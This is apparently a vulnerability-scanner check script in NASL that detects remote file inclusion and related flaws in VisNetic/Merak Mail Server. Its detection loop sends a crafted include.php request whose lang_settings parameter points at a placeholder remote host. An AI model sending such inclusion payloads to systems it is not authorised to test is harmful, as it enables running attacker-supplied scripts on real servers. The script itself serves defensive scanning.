if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.20346" );
	script_version( "2020-08-24T15:18:35+0000" );
	script_tag( name: "last_modification", value: "2020-08-24 15:18:35 +0000 (Mon, 24 Aug 2020)" );
	script_tag( name: "creation_date", value: "2006-03-26 17:55:15 +0200 (Sun, 26 Mar 2006)" );
	script_tag( name: "cvss_base", value: "7.5" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:P/A:P" );
	script_cve_id( "CVE-2005-4556", "CVE-2005-4557", "CVE-2005-4558", "CVE-2005-4559" );
	script_bugtraq_id( 16069 );
	script_name( "VisNetic / Merak Mail Server multiple flaws" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2005 David Maciejak" );
	script_family( "Web application abuses" );
	script_dependencies( "find_service.sc", "httpver.sc", "webmirror.sc", "DDI_Directory_Scanner.sc", "global_settings.sc" );
	script_require_ports( "Services/www", 32000 );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	script_xref( name: "URL", value: "http://secunia.com/secunia_research/2005-62/advisory/" );
	script_xref( name: "URL", value: "http://www.deerfield.com/download/visnetic-mailserver/" );
	script_tag( name: "solution", value: "Upgrade to Merak Mail Server 8.3.5.r / VisNetic Mail Server version
  8.3.5 or later." );
	script_tag( name: "summary", value: "The remote webmail server is affected by multiple vulnerabilities
  which may allow an attacker to execute arbitrary commands on the remote host." );
	script_tag( name: "impact", value: "An attacker could send specially-crafted URLs to execute arbitrary
  scripts, perhaps taken from third-party hosts, or to disclose the content of files on the remote system." );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_tag( name: "qod_type", value: "remote_vul" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
require("misc_func.inc.sc");
port = http_get_port( default: 32000 );
if(!http_can_host_php( port: port )){
	exit( 0 );
}
vt_strings = get_vt_strings();
vt_string = vt_strings["lowercase"];
for dir in make_list( "/mail",
	 "" ) {
	url = NASLString( dir, "/accounts/inc/include.php?language=0&lang_settings[0][1]=http://xxxxxxxxxxxxxxx/", vt_string, "/" );
	req = http_get( item: url, port: port );
	res = http_keepalive_send_recv( port: port, data: req, bodyonly: TRUE );
	if(ContainsString( res, "http://xxxxxxxxxxxxxxx/" + vt_string + "/alang.html" )){
		report = http_report_vuln_url( port: port, url: url );
		security_message( port: port, data: report );
		exit( 0 );
	}
}
exit( 99 );

